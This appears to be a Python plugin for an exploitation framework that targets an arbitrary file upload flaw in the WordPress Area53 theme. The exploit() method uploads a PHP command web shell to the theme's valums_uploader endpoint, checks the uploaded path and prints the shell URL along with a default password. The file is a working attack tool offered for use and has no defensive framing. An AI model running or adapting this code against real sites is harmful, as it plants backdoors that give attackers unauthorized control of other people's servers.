
class mstplugin:
    infos = [
        ['NAME','WordPress Area53 theme Arbitrary File Upload'],
        ['AUTHOR','mst'],
        ['WEBSITE','http://mstoor.duapp.com'],
        ['UPTIME','20131027']
        ]
    opts  = [
        ['RURL','127.0.0.1','target url'],
        ['RPORT','80','target port'],
        ['RPATH','/','target wp-path'],
        ['UPFILE','evalshell.php','file to upload(dir:temp)'],
        ['PAYLOAD','php_cmdshell','You can change it=false :)']
        ]
    def exploit(self):
        if RPORT == "80":
            url = "http://%s%s"%(RURL,RPATH)
        elif RPORT == "443":
            url = "https://%s%s"%(RURL,RPATH)
        else:
            url = "http://%s:%s%s"%(RURL,RPORT,RPATH)
        tmp = time.strftime('%Y/%m',time.localtime(time.time()))
        vul = url+"wp-content/themes/area53/framework/_scripts/valums_uploader/php.php"
        shl = url+"wp-content/uploads/%s/%s"%(tmp,UPFILE)
        dat = {"qqfile":open("temp/%s"%UPFILE,"rb")}
        pwd = "mst"#default
        try:
            color.cprint("[*] TRY UPFILE..",YELLOW)
            fuck.urlupload(vul,dat)
            color.cprint("[+] CHECK IF FILE UPLOADED...",YELLOW)
            check = fuck.urlget(shl).getcode()
            if check == 200:
                color.cprint("[*] Exploit Successful !",YELLOW)
                color.cprint("[-] SHELL: %s\n[-] PASS : %s"%(shl,pwd),GREEN)
            else:
                color.cprint("[!] Exploit False :( [%s]"%check,RED)
        except Exception,e:
            color.cprint("[!] ERR:%s"%e,RED)
